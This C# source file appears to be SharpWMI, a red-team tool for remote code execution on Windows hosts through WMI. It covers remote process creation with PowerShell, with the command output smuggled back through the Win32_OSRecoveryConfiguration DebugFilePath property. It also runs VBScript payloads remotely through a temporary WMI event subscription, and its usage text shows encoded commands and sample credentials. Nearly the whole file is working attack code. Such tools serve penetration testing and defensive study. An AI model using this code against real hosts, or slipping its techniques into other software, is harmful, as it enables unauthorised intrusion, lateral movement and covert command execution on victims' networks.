﻿using System;
using System.Collections.Generic;
using System.Management;
using System.Threading;
namespace SharpWMI
{
    class Program
    {

        // replace the VBS below with whatever logic you want to execute for action=executevbs
        public static string vbsPayload = @"
Set objFileToWrite = CreateObject(""Scripting.FileSystemObject"").OpenTextFile(""C:\out.txt"",2,true)
objFileToWrite.WriteLine(""testing"")
objFileToWrite.Close
Set objFileToWrite = Nothing
";

        static void Usage()
        {
            Console.WriteLine("\r\n  SharpWMI\r\n");
            Console.WriteLine("    Local system enumeration  :\r\n        SharpWMI.exe action=query query=\"select * from win32_service\" [namespace=BLAH]");
            Console.WriteLine("    Remote system enumeration :\r\n        SharpWMI.exe action=query computername=HOST1[,HOST2,...] query=\"select * from win32_service\" [namespace=BLAH]");
            Console.WriteLine("    Remote process creation   :\r\n        SharpWMI.exe action=create computername=HOST[,HOST2,...] command=\"C:\\temp\\process.exe [args]\"");
            Console.WriteLine("    Remote VBS execution      :\r\n        SharpWMI.exe action=executevbs computername=HOST[,HOST2,...] [eventname=blah]\r\n");

            Console.WriteLine("    Note: Any remote function also takes an optional \"username=DOMAIN\\user\" \"password=Password123!\"\r\n");
            Console.WriteLine("\r\n  Examples:\r\n");
            Console.WriteLine("    SharpWMI.exe action=query query=\"select * from win32_process\"");
            Console.WriteLine("    SharpWMI.exe action=query query=\"SELECT * FROM AntiVirusProduct\" namespace=\"root\\SecurityCenter2\"");
            Console.WriteLine("    SharpWMI.exe action=query computername=primary.testlab.local query=\"select * from win32_service\"");
            Console.WriteLine("    SharpWMI.exe action=query computername=primary,secondary query=\"select * from win32_process\"");
            Console.WriteLine("    SharpWMI.exe action=create computername=primary.testlab.local command=\"powershell.exe -enc ZQBj...\"");
            Console.WriteLine("    SharpWMI.exe action=executevbs computername=primary.testlab.local");
            Console.WriteLine("    SharpWMI.exe action=executevbs computername=primary.testlab.local username=\"TESTLAB\\harmj0y\" password=\"Password123!\"");
        }

        // helper used to wrap long output
        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")
        {
            ManagementObjectSearcher wmiData = null;

            try
            {
                if (String.IsNullOrEmpty(wmiNameSpace))
                {
                    wmiData = new ManagementObjectSearcher(wmiQuery);
                }
                else
                {
                    wmiData = new ManagementObjectSearcher(wmiNameSpace, wmiQuery);
                }

                ManagementObjectCollection data = wmiData.Get();
                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        string propValue = String.Format("{0}", prop.Value);
                        
                        // wrap long output to 80 lines
                        if (!String.IsNullOrEmpty(propValue) && (propValue.Length > 90))
                        {
                            bool header = false;
                            foreach (string line in Split(propValue, 80))
                            {
                                if (!header)
                                {
                                    Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, line));
                                }
                                else
                                {
                                    Console.WriteLine(String.Format("{0,30}   {1}", "", line));
                                }
                                header = true;
                            }
                        }
                        else
                        {
                            Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                        }
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        static void RemoteWMIQuery(string host, string wmiQuery, string wmiNameSpace, string username, string password)
        {
            if (wmiNameSpace == "")
            {
                wmiNameSpace = "root\\cimv2";
            }

            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }
        static string GetWMIProperty(string host, string username, string password)
        {
            string wmiNameSpace = "root\\cimv2";
            ConnectionOptions options = new ConnectionOptions();
            if (!String.IsNullOrEmpty(username))
            {
                options.Username = username;
                options.Password = password;
            }
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            string wmiQuery = @"SELECT DebugFilePath FROM Win32_OSRecoveryConfiguration";
            try
            {
                scope.Connect();
                ObjectQuery query = new ObjectQuery(wmiQuery);
                string WMIProperty = "";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();
                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        WMIProperty = prop.Value.ToString();
                    }

                }
                return WMIProperty;
            }
            catch (Exception ex)
            {
                return "";
            }
           
        }

        static void SetWMIProperty(string host, string username, string password, string newvalue)
        {
            string wmiNameSpace = "root\\cimv2";
            ConnectionOptions options = new ConnectionOptions();
            if (!String.IsNullOrEmpty(username))
            {
                options.Username = username;
                options.Password = password;
            }
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_OSRecoveryConfiguration"), null);
            ManagementObjectCollection MyCollection = configClass.GetInstances();
            try
            {
                foreach (ManagementObject MyObject in MyCollection)
                {
                    MyObject.SetPropertyValue("DebugFilePath", newvalue);
                    MyObject.Put();
                }
                Console.WriteLine("[*] Done!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception in recovery: {0}", ex.Message);
                return;
            }
           
        }


        static void RemoteWMIExecute(string host, string command, string username, string password)
        {
            string wmiNameSpace = "root\\cimv2";
            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n[*] Host                           : {0}", host);
            Console.WriteLine("[*] Command                        : {0}", command);

          
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[*] User credentials               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
           
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            // Store data in existing WMI property, but keep original value
            string Original_WMIProperty = GetWMIProperty(host,username,password);
            try
            {
                scope.Connect();

                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
                System.Management.PropertyDataCollection properties = inParams.Properties;
                string tmpcmd = String.Format("$output = ({0} | Out-String).Trim(); $EncodedText = [Int[]][Char[]]$output -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()",command);
                inParams["CommandLine"] = "powershell " + tmpcmd;      
                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);


                Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
                Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);
                int count = 0;
                while (true)
                {
                    string New_WMIProperty = GetWMIProperty(host, username, password);
                    if (New_WMIProperty == Original_WMIProperty)
                    {
                        if (count < 3)
                        {
                            count++;
                            Console.WriteLine("[*] Tring get result...");
                            Thread.Sleep(3000);
                        }
                        else {
                            Console.WriteLine("[-] Maybe no result. exit...");
                            System.Environment.Exit(0);
                        }                       
                        
                    }
                    else
                    {
                        string[] tmp = New_WMIProperty.Split(',');
                        string result = "";
                        foreach (string i in tmp)
                        {
                            result += Convert.ToChar(Convert.ToInt32(i));
                        }
                        Console.WriteLine("[+] Execute result:\r\n\r\n {0}\r\n", result);
                        break;
                    }
                }
                Console.WriteLine("[*] Recovery WMI Property..");
                SetWMIProperty(host, username, password, Original_WMIProperty);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }



        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials: {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                // first create a 30 second timer on the remote host
                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();
                myTimer["IntervalBetweenEvents"] = (UInt32)30000;
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";
                try
                {
                    Console.WriteLine("[*] Creating 'Timer' object on {0}", host);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                try
                {
                    Console.WriteLine("[*] Setting '{0}' event filter on {1}", eventName, host);
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter: {0}", ex.Message);
                }


                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbsPayload;
                myEventConsumer["KillTimeout"] = (UInt32)45;

                try
                {
                    Console.WriteLine("[*] Setting '{0}' event consumer on {1}", eventName, host);
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }


                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    Console.WriteLine("[*] Binding '{0}' event filter and consumer on {1}", eventName, host);
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }


                // wait for everything to trigger
                Console.WriteLine("\r\n[*] Waiting 45 seconds for event to trigger on {0} ...\r\n", host);
                System.Threading.Thread.Sleep(45 * 1000);


                // finally, cleanup
                try
                {
                    Console.WriteLine("[*] Removing 'Timer' internal timer from {0}", host);
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing FilterToConsumerBinding from {0}", host);
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event filter from {1}", eventName, host);
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event consumer from {0}\r\n", eventName, host);
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }

            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }

            if (!arguments.ContainsKey("action"))
            {
                Usage();
                return;
            }

            if (arguments["action"] == "query")
            {
                if (!arguments.ContainsKey("query"))
                {
                    Usage();
                    return;
                }

                if (arguments.ContainsKey("computername"))
                {
                    // remote query
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames) {
                        if (arguments.ContainsKey("namespace"))
                        {
                            RemoteWMIQuery(computerName, arguments["query"], arguments["namespace"], username, password);
                        }
                        else
                        {
                            RemoteWMIQuery(computerName, arguments["query"], "", username, password);
                        }
                    }
                }
                else
                {
                    // local query
                    if (arguments.ContainsKey("namespace"))
                    {
                        LocalWMIQuery(arguments["query"], arguments["namespace"]);
                    }
                    else
                    {
                        LocalWMIQuery(arguments["query"]);
                    }
                }
            }

            else if (arguments["action"] == "create")
            {
                // remote process call creation
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        RemoteWMIExecute(computerName, arguments["command"], username, password);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if (arguments["action"] == "executevbs")
            {
                // remote VBS execution
                if (arguments.ContainsKey("computername"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string eventName = "Debug";
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        RemoteWMIExecuteVBS(computerName, eventName, username, password);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else
            {
                Usage();
                return;
            }
        }
    }
}
